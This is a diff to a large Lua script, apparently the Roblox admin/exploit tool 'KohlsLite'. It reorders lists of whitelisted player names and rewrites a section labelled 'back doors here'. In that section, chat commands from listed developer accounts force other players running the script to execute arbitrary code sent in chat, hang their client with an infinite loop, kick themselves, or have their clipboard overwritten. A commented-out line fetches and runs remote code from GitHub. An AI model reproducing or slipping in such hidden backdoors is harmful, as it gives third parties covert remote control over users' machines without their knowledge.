@@ -214,106 +214,106 @@ local whitelist = {}
 -- Perm Whitelist
  -- yeah i know i should use user ids instead just wait for that update that will come out in 2030 --
 local pwl = {
-    "me_123eq",
-    "me_crashking",
-    "ScriptingProgrammer",
-    "t_echr",
-    "BANNter_Original",
-    "witnessfox22",
-    "IceStuds",
-    "atprog",
-    "Di33le2",
-    "darkmadeboy",
-    "Dekryptionite",
-    "Redstoneboy2008",
-    "decryptionites",
+    "3akakauuky",
     "3cxos",
-    "ripcxo",
-    "hudhejeir",
+    "4g8h",
+    "Altsarecooleh",
+    "Anka_707587",
+    "atprog",
+    "BANNter_Original",
     "BIGpe7niss7",
     "clydekash",
-    "t_echl",
-    "Ih0temyIife",
     "D_ionte",
-    "SZCVAK",
-    "TheRealestOnHere",
-    "Altsarecooleh",
-    "idonthacklol101ns",
-    "Me_ChurchOfSat4n",
-    "Milderous",
-    "Anka_707587",
-    "DionteIsCute",
-    "me_capybara",
-    "E4_DQ",
-    "vgcrash",
-    "s_pisafurry",
-    "YT_MATHEUSMODZ5", 
-    "kevin3050ti",
-    "grimAuxiliatrix",
-    "ikbx",
-    "undertaker629",
-    "Eggkid7",
-    "4g8h",
-    "kohlslitedev",
-    "Palamode",
-    "whatveidone",
-    "yeyeyeweweweye",
-    "siga5167",
-    "3akakauuky",
+    "darkmadeboy",
     "dawninja21",
-    "Dawninja21alt"
+    "Dawninja21alt",
+    "decryptionites",
+    "Dekryptionite",
+    "Di33le2",
+    "DionteIsCute",
+    "E4_DQ",
+    "Eggkid7",
+    "grimAuxiliatrix",
+    "hudhejeir",
+    "IceStuds",
+    "idonthacklol101ns",
+    "Ih0temyIife",
+    "ikbx",
+    "kevin3050ti",
+    "kohlslitedev",
+    "me_123eq",
+    "me_capybara",
+    "Me_ChurchOfSat4n",
+    "me_crashking",
+    "Milderous",
+    "Palamode",
+    "Redstoneboy2008",
+    "ripcxo",
+    "s_pisafurry",
+    "ScriptingProgrammer",
+    "siga5167",
+    "SZCVAK",
+    "t_echl",
+    "t_echr",
+    "TheRealestOnHere",
+    "undertaker629",
+    "vgcrash",
+    "whatveidone",
+    "witnessfox22",
+    "yeyeyeweweweye",
+    "YT_MATHEUSMODZ5"
 }
 
 -- Players you cannot kick
 local nokick = {
-  "me_123eq",
-    "me_crashking",
-    "ScriptingProgrammer",
-    "t_echr",
-    "BANNter_Original",
-    "witnessfox22",
-    "IceStuds",
-    "atprog",
-    "Di33le2",
-    "darkmadeboy",
-    "Dekryptionite",
-    "Redstoneboy2008",
-    "decryptionites",
+    "3akakauuky",
     "3cxos",
-    "ripcxo",
-    "hudhejeir",
+    "4g8h",
+    "Altsarecooleh",
+    "Anka_707587",
+    "atprog",
+    "BANNter_Original",
     "BIGpe7niss7",
     "clydekash",
-    "t_echl",
-    "Ih0temyIife",
     "D_ionte",
-    "SZCVAK",
-    "TheRealestOnHere",
-    "Altsarecooleh",
-    "idonthacklol101ns",
-    "Me_ChurchOfSat4n",
-    "Milderous",
-    "Anka_707587",
-    "DionteIsCute",
-    "me_capybara",
-    "E4_DQ",
-    "vgcrash",
-    "s_pisafurry",
-    "YT_MATHEUSMODZ5", 
-    "kevin3050ti",
-    "grimAuxiliatrix",
-    "ikbx",
-    "undertaker629",
-    "Eggkid7",
-    "4g8h",
-    "kohlslitedev",
-    "Palamode",
-    "whatveidone",
-    "yeyeyeweweweye",
-    "siga5167",
-    "3akakauuky",
+    "darkmadeboy",
     "dawninja21",
-    "Dawninja21alt"
+    "Dawninja21alt",
+    "decryptionites",
+    "Dekryptionite",
+    "Di33le2",
+    "DionteIsCute",
+    "E4_DQ",
+    "Eggkid7",
+    "grimAuxiliatrix",
+    "hudhejeir",
+    "IceStuds",
+    "idonthacklol101ns",
+    "Ih0temyIife",
+    "ikbx",
+    "kevin3050ti",
+    "kohlslitedev",
+    "me_123eq",
+    "me_capybara",
+    "Me_ChurchOfSat4n",
+    "me_crashking",
+    "Milderous",
+    "Palamode",
+    "Redstoneboy2008",
+    "ripcxo",
+    "s_pisafurry",
+    "ScriptingProgrammer",
+    "siga5167",
+    "SZCVAK",
+    "t_echl",
+    "t_echr",
+    "TheRealestOnHere",
+    "undertaker629",
+    "vgcrash",
+    "whatveidone",
+    "witnessfox22",
+    "yeyeyeweweweye",
+    "YT_MATHEUSMODZ5"
 }
 
 -- Users that can use blacklisted gears (or gears when antigear is on)
@@ -321,54 +321,54 @@ local GWhitelisted = {}
 
 -- Perm Gear Whitelist
 local pgwl = {
-    "me_123eq",
-    "me_crashking",
-    "ScriptingProgrammer",
-    "t_echr",
-    "BANNter_Original",
-    "witnessfox22",
-    "IceStuds",
-    "atprog",
-    "Di33le2",
-    "darkmadeboy",
-    "Dekryptionite",
-    "Redstoneboy2008",
-    "decryptionites",
+    "3akakauuky",
     "3cxos",
-    "ripcxo",
-    "hudhejeir",
+    "4g8h",
+    "Altsarecooleh",
+    "Anka_707587",
+    "atprog",
+    "BANNter_Original",
     "BIGpe7niss7",
     "clydekash",
-    "t_echl",
-    "Ih0temyIife",
     "D_ionte",
-    "SZCVAK",
-    "TheRealestOnHere",
-    "Altsarecooleh",
-    "idonthacklol101ns",
-    "Me_ChurchOfSat4n",
-    "Milderous",
-    "Anka_707587",
-    "DionteIsCute",
-    "me_capybara",
-    "E4_DQ",
-    "vgcrash",
-    "s_pisafurry",
-    "YT_MATHEUSMODZ5", 
-    "kevin3050ti",
-    "grimAuxiliatrix",
-    "ikbx",
-    "undertaker629",
-    "Eggkid7",
-    "4g8h",
-    "kohlslitedev",
-    "Palamode",
-    "whatveidone",
-    "yeyeyeweweweye",
-    "siga5167",
-    "3akakauuky",
+    "darkmadeboy",
     "dawninja21",
-    "Dawninja21alt"
+    "Dawninja21alt",
+    "decryptionites",
+    "Dekryptionite",
+    "Di33le2",
+    "DionteIsCute",
+    "E4_DQ",
+    "Eggkid7",
+    "grimAuxiliatrix",
+    "hudhejeir",
+    "IceStuds",
+    "idonthacklol101ns",
+    "Ih0temyIife",
+    "ikbx",
+    "kevin3050ti",
+    "kohlslitedev",
+    "me_123eq",
+    "me_capybara",
+    "Me_ChurchOfSat4n",
+    "me_crashking",
+    "Milderous",
+    "Palamode",
+    "Redstoneboy2008",
+    "ripcxo",
+    "s_pisafurry",
+    "ScriptingProgrammer",
+    "siga5167",
+    "SZCVAK",
+    "t_echl",
+    "t_echr",
+    "TheRealestOnHere",
+    "undertaker629",
+    "vgcrash",
+    "whatveidone",
+    "witnessfox22",
+    "yeyeyeweweweye",
+    "YT_MATHEUSMODZ5"
 }
 
 -- Developers of KL
@@ -10147,77 +10147,123 @@ function PLRSTART(v)
                     -- // dev section (back doors here) \\ --
 
                     if string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then -- klc means KohlsLite Check
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
-                            Speak("I use KohlsLite!")
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) then
+				--print("kohlslite user")
+			else
+                            	Speak("I use KohlsLite!")
                         end
                     end
 
-                    if string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
-                            Speak("Collect my pages pav...")
+                    if string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then -- prc means PR Check (but it's KohlsLite though)
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) then
+				--print("kohlslite user")
+			else
+                            	Speak("Collect my pages...")
                         end
                     end
+
 
                     if string.sub(msg:lower(), 0, 5) == "-clip" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
-                            setclipboard("https://discord.gg/kah")
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) then
+				--print("kohlslite user")
+			else
+				if setclipboard then
+                            		setclipboard("https://discord.gg/kah")
+				else
+					print("https://discord.gg/kah")
+					Speak("My executor is terrible!")
+				end
                         end
                     end
 
+                    if string.sub(msg:lower(), 0, 5) == "-clip" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) then
+				--print("kohlslite user")
+			else
+				if setclipboard then
+                            		setclipboard("https://discord.gg/kah")
+				else
+					print("https://discord.gg/kah")
+					Speak("My executor is terrible!")
+				end
+                        end
+                    end
+
+
                     if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then -- klk means KohlsLite Kick
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) then
+				--print("kohlslite user")
+			else
                             pcall(function()
                                     game.Players.LocalPlayer:Kick("A KohlsLite dev kicked you from the game!")
                             end)
                         end
                     end
 
-                    if string.sub(msg:lower(), 0, 4) == "-prk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
+                    if string.sub(msg:lower(), 0, 4) == "-prk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then -- prk means PR Kick (but it's KohlsLite though)
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) then
+				--print("kohlslite user")
+			else
                             pcall(function()
                                     game.Players.LocalPlayer:Kick("FE BYPASSED ~atprog")
                             end)
                         end
                     end
 
+
                     if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) then
+				-- print("kohlslite user")
+			else
                             Remind("You have been warned by a KohlsLite dev!")
                         end
                     end
 
                     if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) then
+				-- print("kohlslite user")
+			else
                             Remind("You have been warned by a KohlsLite collaborator!")
                         end
                     end
 
+
                     if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) then
+				-- print("capybara")
+			else
                             while true do end
                         -- game:Shutdown()
                         end
                     end
 
                     if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-			if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
+			if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) then
+				-- print("capybara")
+			else
                             while true do end
                         -- game:Shutdown()
                         end
                     end
 
+
                     if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-			if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
+			if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) then
+				-- print("run")
+			else
 			    Execute(string.sub(msg, 6))
 			end
                     end
 
                     if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) then
+				-- print("run")
+			else
                             Execute(string.sub(msg, 6))
                         end
                     end
---[[
+
+		--[[
                     if string.sub(msg:lower(), 0, 4) == "-prs" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
 	                if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
                         	loadstring(game:HttpGet("https://raw.githubusercontent.com/ThisSadQWE31/beamd/main/procod"))()
@@ -10225,16 +10271,21 @@ function PLRSTART(v)
                     end]]
 
                     if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) then
+				-- print("load")
+			else
                             GExecute(string.sub(msg, 7))
                         end
                     end
 
                     if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-                        if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) then
+				-- print("load")
+			else
                             GExecute(string.sub(msg, 7))
                         end
                     end
+
         	end)
 
             -- END OF DEV SECTION --
